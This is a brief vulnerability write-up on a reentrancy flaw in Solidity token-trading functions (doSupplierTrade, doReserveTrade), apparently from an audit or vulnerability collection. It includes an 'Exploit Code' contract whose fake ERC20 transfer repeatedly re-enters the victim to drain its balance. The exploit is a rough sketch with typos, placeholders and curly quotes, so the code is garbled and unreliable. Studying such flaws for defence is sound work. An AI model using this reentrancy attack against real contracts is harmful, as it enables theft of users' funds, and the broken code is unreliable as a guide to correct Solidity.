## Vulnerable Code

```javascript
**Instance_1**
function doSupplierTrade(
        ERC20 src,
        uint amount,
        ERC20 dest,
        address destAddress,
        uint expectedDestAmount,
        SupplierInterface supplier,
        uint conversionRate,
        bool validate
    )
        internal
        returns(bool)
    {
        uint callValue = 0;
        
        if (src == ETH_TOKEN_ADDRESS) {
            callValue = amount;
        } else {
            // take src tokens to this contract
            require(src.transferFrom(msg.sender, this, amount));
        }

        // supplier sends tokens/eth to network. network sends it to destination

        require(supplier.trade.value(callValue)(src, amount, dest, this, conversionRate, validate)); //Vulnerable position_1
        emit SupplierTrade(callValue, src, amount, dest, this, conversionRate, validate);

        if (dest == ETH_TOKEN_ADDRESS) {
            destAddress.transfer(expectedDestAmount); 
        } else {
            require(dest.transfer(destAddress, expectedDestAmount)); //Vulnerable position_2
        }

        return true;
    }
    
    
**Instance_2**
function doReserveTrade(
        ERC20 src,
        uint amount,
        ERC20 dest,
        address destAddress,
        uint expectedDestAmount,
        KyberReserveInterface reserve,
        uint conversionRate,
        bool validate
        )
        internal
        returns(bool)
        {
        uint callValue = 0;

        if (src == dest) {
            //this is for a "fake" trade when both src and dest are ethers.
            if (destAddress != (address(this)))
                destAddress.transfer(amount);
            return true;
        }

        if (src == ETH_TOKEN_ADDRESS) {
            callValue = amount;
        }

        // reserve sends tokens/eth to network. network sends it to destination
        require(reserve.trade.value(callValue)(src, amount, dest, this, conversionRate, validate));

        if (destAddress != address(this)) {
            //for token to token dest address is network. and Ether / token already here...
            if (dest == ETH_TOKEN_ADDRESS) {
                destAddress.transfer(expectedDestAmount);
            } else {
                require(dest.transfer(destAddress, expectedDestAmount));
            }
        }

        return true;
}
```



## Exploit Code

```javascript
contract ERC20{

}
Contract Attack is ERC20, xxxx{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton transfer() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“doSupplierTrade(ERC20, uint, ERC20, address, uint, SupplierInterface, uint, bool)”)), ..., ..., ERC20(this), ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF dest object obtained from a malicious address, the method of "transfer" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate paramete.'XXXX' represents the Vulnerability contracts's name
